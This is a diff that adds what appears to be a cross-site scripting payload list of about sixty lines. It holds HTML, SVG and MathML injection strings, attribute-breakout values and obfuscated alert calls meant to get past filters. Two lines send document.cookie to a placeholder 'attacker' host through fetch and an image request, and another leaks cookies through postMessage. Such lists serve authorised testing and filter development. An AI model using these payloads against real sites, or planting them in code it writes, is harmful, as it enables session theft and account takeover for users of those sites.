@@ -1,0 +1,63 @@
+<script>alert(1)</script>
+" autofocus onfocus="alert(1)"
+'><script>alert(1)</script>
+"><svg/onload=alert(1)>
+"><img src=x onerror=alert(1)>
+'><img/src/onerror=alert(1)>
+"><body onload=alert(1)>
+<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1) dur=1s repeatCount=1></svg>
+<svg/onload=globalThis['al'+'ert'](1)>
+<svg><script>alert`1`</script>
+</script><script>alert(1)</script>
+<iframe srcdoc='<script>alert(1)</script>'></iframe>
+<math><mtext></math><img src=x onerror=alert(1)>
+<svg><script href=data:text/javascript,alert(1)></script>
+<iframe/onload=alert(1) src=about:blank>
+<svg><set attributeName=onload to="alert(1)"></svg>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video><source onerror="alert(1)" src=1>
+<svg><animate attributeName=href begin=1s from=0 to="javascript:alert(1)">
+<svg><a xlink:href="javascript:alert(1)">CLICK</a></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject requiredExtensions="http://www.w3.org/1999/xhtml"><x xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></x></foreignObject></svg>
+<math xmlns="http://www.w3.org/1998/Math/MathML"><mstyle displaystyle="true" onload="alert(1)"></math>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
+<svg><style>*{animation:foo 1s}</style><script>x=alert;x(1)</script>
+<svg><script>setTimeout('alert(1)')</script>
+<script src=data:,alert(1)></script>
+<script>alert(document.domain)</script>
+<svg><script>alert(document.cookie)</script>
+<iframe src=javascript:alert(1)>
+<svg/onload=alert(atob('MSk='))>
+<svg/onload=top['al'+'ert'](1)>
+<svg/onload=alert(JSON.stringify(location))>
+<svg/onload=fetch('https://attacker/?c='+document.cookie)>
+<svg><script>new Image().src='//attacker/?'+document.cookie</script>
+<svg><script>confirm(1)</script>
+<svg><script>prompt(1)</script>
+<script>alert(parent.origin)</script>
+"><svg/onload=alert(document.domain)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+" onmouseover="alert(1)" x="
+" accesskey="x" onclick="alert(1)"
+" style="animation-name:x" onanimationstart="alert(1)"
+" style="-webkit-transition:color 1s" ontransitionend="alert(1)"
+" style="-webkit-backdrop-filter:invert(100%)" onwebkittransitionend="alert(1)"
+"><script>throw alert(1)</script>
+"><script>setInterval`alert\x281\x29`</script>
+"><svg><script>eval('alert(1)')</script>
+" onfocus="alert(1)" autofocus="
+"><body onfocus=alert(1)>
+<math><mrow><mi onclick="alert(1)">X</mi></mrow></math>
+<svg><script>location='javascript:alert(1)'</script>
+<svg><script>location.href='javascript:alert(1)'</script>
+<svg><script>setTimeout(()=>alert(1))</script>
+<script>alert`XSS-${document.domain}`</script>
+<svg><script>top.location='javascript:alert(1)'</script>
+<svg><script>parent.postMessage(document.cookie,'*')</script>
+<svg><script>throw alert`1`</script>
+<svg><script>Function('alert(1)')()</script>
+<svg><script>window.name=alert(1)</script>
+<svg><script>var x=document.createElement('script');x.innerHTML='alert(1)';document.body.append(x);</script>
